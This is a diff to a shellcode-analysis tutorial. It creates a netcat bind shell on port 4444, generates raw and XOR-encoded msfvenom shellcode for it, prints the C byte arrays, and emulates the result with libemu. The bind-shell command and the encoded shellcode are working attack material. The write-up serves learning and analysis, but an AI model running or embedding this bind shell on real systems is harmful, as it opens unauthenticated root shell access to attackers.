@@ -6,21 +6,62 @@ The command being executed will be: nc -nlp 4444 -e "/bin/sh" &
   - This will create a bind shell, on TCP port 4444, on all network interfaces, and then background the process.
 Testing out the command:
 ```c
-root@zed# nc -nlp 4444 -e "/bin/sh" &
+root# nc -nlp 4444 -e "/bin/sh" &
 [1] 9119
-root@zed# netstat -tnalp | grep nc
+root# netstat -tnalp | grep nc
 tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      9119/nc
 ```
 We can see that the command successfully ran and was given the process ID 9119 and the job ID of 1.
 Using netstat we see that the process nc is successfully listening on all interfaces (0.0.0.0), on TCP port 4444.
 Since the job is running in the background, we can use the same terminal window to access our /bin/sh listening on all interfaces, by using netcat to connect to the localhost interface (127.0.0.1) on TCP port 4444.
 ```c
-root@zed# nc 127.0.0.1 4444
+root# nc 127.0.0.1 4444
 id
 uid=0(root) gid=0(root) groups=0(root),46(plugdev)
 ```
 We successfully are able to run commands with our netcat, bind shell.
 
-Now we will use msfvenom to create a shellcode to execute our netcat, bind shell command.
+Now we will use msfvenom to create a shellcode to execute our netcat, bind shell command. The output will be in C so we can easily add it to our shellcode.c program.
 ```c
+root# msfvenom --payload linux/x86/exec CMD='nc -nlp 4444 -e "/bin/sh" &' --format c
+Payload size: 63 bytes
+unsigned char buf[] = 
+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
+"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x1c\x00\x00\x00\x6e"
+"\x63\x20\x2d\x6e\x6c\x70\x20\x34\x34\x34\x34\x20\x2d\x65\x20"
+"\x22\x2f\x62\x69\x6e\x2f\x73\x68\x22\x20\x26\x00\x57\x53\x89"
+"\xe1\xcd\x80";
+```
+This payload contains NULL bytes, rendering it useless for shellcode. We will use the builtin XOR encoder to encode our payload before we analyze it.
+```c
+root# msfvenom --payload linux/x86/exec CMD='nc -nlp 4444 -e "/bin/sh" &' --format c --encoder x86/xor_dynamic     
+x86/xor_dynamic chosen with final size 109
+Payload size: 109 bytes
+unsigned char buf[] =
+"\xeb\x23\x5b\x89\xdf\xb0\x1a\xfc\xae\x75\xfd\x89\xf9\x89\xde"                                                         
+"\x8a\x06\x30\x07\x47\x66\x81\x3f\x88\x02\x74\x08\x46\x80\x3e"                                                         
+"\x1a\x75\xee\xeb\xea\xff\xe1\xe8\xd8\xff\xff\xff\x02\x1a\x68"                                                         
+"\x09\x5a\x9b\x50\x64\x6a\x2f\x61\x8b\xe5\x6a\x2d\x71\x6a\x02"                                                         
+"\x6a\x2d\x60\x6b\x6c\x8b\xe1\x50\xea\x1e\x02\x02\x02\x6c\x61"                                                         
+"\x22\x2f\x6c\x6e\x72\x22\x36\x36\x36\x36\x22\x2f\x67\x22\x20"                                                         
+"\x2d\x60\x6b\x6c\x2d\x71\x6a\x20\x22\x24\x02\x55\x51\x8b\xe3"                                                         
+"\xcf\x82\x88\x02";
+```
+Perfect, now our shellcode is NULL free. Next we will use sctest from libemu to analyze the shellcode.
+> I used my  64-bit Kali machine to create the 32-bit MSF Venom shellcode, and to analyze it with libemu. Unfortunately I could not find a trust-worthy download from the internet. Fortunately libemu is included in the kali repo.
+```c
+root# apt search libemu
+libemu2/kali-rolling,now 0.2.0+git20120122-1.2+b1 amd64 [installed,automatic]
+  x86 shellcode detection and emulation
+```
+Now that we have libemu, we will pipe our payload from msfvenom into sctest. Using sctest from libemu, we will create a visual map of how the shellcode is being executed.
+```c
+root# msfvenom --payload linux/x86/exec CMD='nc -nlp 4444 -e "/bin/sh" &' --encoder x86/xor_dynamic | sctest -Ss 10000 -vvv -G execNC.dot
+# Convert from dot to png
+root# dot -Tpng execNC.dot -o execNC.png
+# open png picture with eog
+eog execNC.png
+```
+![](/execNC.png)
+
 
